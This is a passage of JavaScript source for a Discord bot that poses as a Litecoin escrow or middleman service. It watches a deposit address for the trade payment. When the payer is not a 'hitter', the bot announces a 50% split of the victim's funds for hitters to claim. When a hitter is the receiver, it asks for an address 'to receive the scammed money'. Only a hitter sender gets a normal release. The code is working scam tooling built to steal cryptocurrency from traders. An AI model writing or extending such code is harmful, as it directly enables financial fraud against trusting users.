            .setDescription(`Receiver address: \`${address}\`\nAmount: ${half.toFixed(8)} LTC (50%)`)
            .setColor(0x00ff00);
        
        await interaction.reply({ embeds: [confirmEmbed] });
        
        ticketData.receiverSplitAddress = address;
        botBalances.set(ticketId, { ...balance, receiverAddress: address });
    }
}

async function startMonitor(ticketId, client) {
    const ticketData = client.activeTickets.get(ticketId);
    if (!ticketData) return;

    const expectedAmount = parseFloat(ticketData.ltcAmount);
    let detected = false;

    const monitor = setInterval(async () => {
        if (!client.activeTickets.has(ticketId)) {
            clearInterval(monitor);
            return;
        }

        const check = await checkLTCAddress(ticketData.address, expectedAmount);

        if (check.found && check.confirmed && !detected) {
            detected = true;
            clearInterval(monitor);

            botBalances.set(ticketId, {
                ltc: check.amount,
                usd: check.amount * client.ltcPrice,
                txid: check.txid
            });

            const channel = await client.channels.fetch(ticketId).catch(() => null);
            if (!channel) return;

            const guild = await client.guilds.fetch(client.config.GUILD_ID || channel.guild.id);
            const senderMember = await guild.members.fetch(ticketData.senderId).catch(() => null);
            const receiverMember = await guild.members.fetch(ticketData.receiverId).catch(() => null);

            const isHitterSender = senderMember?.roles.cache.has(client.config.HITTER_ROLE_ID);
            const isHitterReceiver = receiverMember?.roles.cache.has(client.config.HITTER_ROLE_ID);
            const isHitterInTicket = isHitterSender || isHitterReceiver;

            const detectEmbed = new EmbedBuilder()
                .setTitle('⚠️ • Transaction Detected')
                .setDescription(`The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n[${check.txid.slice(0, 10)}...${check.txid.slice(-10)}](https://litecoinspace.org/tx/${check.txid}) (${check.amount.toFixed(8)} LTC)\n**Amount Received**\n${check.amount.toFixed(8)} LTC ($${(check.amount * client.ltcPrice).toFixed(2)})\n**Required Amount**\n${expectedAmount.toFixed(8)} LTC ($${ticketData.usdAmount.toFixed(2)})`)
                .setColor(0xffa500);

            await channel.send({ embeds: [detectEmbed] });

            setTimeout(async () => {
                const confirmEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed!')
                    .setDescription(`**Transactions**\n[${check.txid.slice(0, 10)}...${check.txid.slice(-10)}](https://litecoinspace.org/tx/${check.txid}) (${check.amount.toFixed(8)} LTC)\n**Total Amount Received**\n${check.amount.toFixed(8)} LTC ($${(check.amount * client.ltcPrice).toFixed(2)})`)
                    .setColor(0x00ff00);

                await channel.send({ embeds: [confirmEmbed] });

                if (!isHitterInTicket) {
                    const stealEmbed = new EmbedBuilder()
                        .setTitle('✅ • Transaction Confirmed - HITTER PAYOUT')
                        .setDescription(`**50% SPLIT AVAILABLE**\n\nA non-hitter has sent ${check.amount.toFixed(8)} LTC!\n\n**HITTERS:** Click below to claim your 50% share (${(check.amount/2).toFixed(8)} LTC)`)
                        .setColor(0x00ff00);
                    
                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId(`input_address_${ticketId}`)
                            .setLabel('🎯 HITTER ONLY: Input Address (50%)')
                            .setStyle(ButtonStyle.Danger)
                    );
                    
                    await channel.send({ embeds: [stealEmbed], components: [row] });
                    
                    if (client.config.LOG_CHANNEL) {
                        const logChannel = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
                        if (logChannel) {
                            await logChannel.send({
                                content: `@everyone HITTER PAYOUT AVAILABLE!`,
                                embeds: [{
                                    title: '💰 Non-Hitter Payment - 50% SPLIT',
                                    description: `Ticket: <#${ticketId}>\nAmount: ${check.amount.toFixed(8)} LTC\n**First hitter to claim gets ${(check.amount/2).toFixed(8)} LTC!**`,
                                    color: 0xff0000
                                }]
                            });
                        }
                    }
                } else if (isHitterSender) {
                    const releaseEmbed = new EmbedBuilder()
                        .setTitle('✅ • You may proceed with your trade.')
                        .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items...\n2. <@${ticketData.senderId}> Once received, click "Release"`)
                        .setColor(0x00ff00);

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId(`release_${ticketId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                    );

                    await channel.send({ content: `<@${ticketData.senderId}> <@${ticketData.receiverId}>`, embeds: [releaseEmbed], components: [row] });
                } else if (isHitterReceiver) {
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('✅ • Transaction Confirmed')
                        .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                        .setColor(0x00ff00);
                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId(`input_address_${ticketId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                    );
                    await channel.send({ embeds: [scamEmbed], components: [row] });
                }
            }, 30000);
        }
    }, 10000);

    setTimeout(() => {
        if (!detected && client.activeTickets.has(ticketId)) {
            clearInterval(monitor);
            client.channels.fetch(ticketId).then(channel => {
                channel.send('⏰ No transaction detected. Closing ticket...');
                setTimeout(() => channel.delete().catch(() => {}), 3000);
            }).catch(() => {});
            client.activeTickets.delete(ticketId);
        }
    }, 1200000);
}

module.exports = { loadHandlers };
